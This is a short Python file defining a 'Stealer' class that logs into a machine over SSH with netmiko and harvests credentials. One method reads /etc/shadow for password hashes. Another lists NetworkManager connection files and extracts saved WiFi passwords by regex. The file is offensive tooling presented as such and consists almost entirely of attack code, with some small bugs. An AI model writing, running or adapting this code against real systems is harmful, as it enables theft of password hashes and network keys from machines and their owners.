import netmiko
import re

class Stealer:
    def __init__ (self, host, username, password=None, key_file=None, passphrase=None, port=22):
        if password == None and key_file == None:
            raise 'Must sp3cify passw0rd or k3y!'
        self.config = { 
            'device_type': 'autodetect',
            "host" : host, 
            "username" : username,
            "port" : port
            }
        if password is not None:
            self.config['password'] = password
        if key_file is not None:
            self.config['use_keys'] = True
            self.config['key_file'] = key_file
            self.config['passphrase'] = passphrase

        self.connection = netmiko.ConnectHandler(**self.config)


    def steal_hashes(self):
        print('[*] Stealing hashes ... ')
        users = self.connection.send_command('cat /etc/shadow')
        if 'Permission denied' in users:
            print('[-] no permissions')

    def steal_wifi(self):
        print('[*] Stealing WiFi keys ... ')
        wifi_connections = self.connection.send_command('ls /etc/NetworkManager/system-connections/')
        if 'No such file or directory' in wifi_connections:
            print('[-] No WiFi :(')
        wifi_connections = [wifi for wifi in wifi_connections.split(' ') if wifi != '']
        print('[*] Found WiFI connections: ')
        for connection in wifi_connections:
            data = self.connection.send_command(f'cat /etc/NetworkManager/system-connections/{connection}')
            passwd = re.findall(r'psk=(.+)', data)[1]
            print(f"[+] {connection} : {passwd}")
   
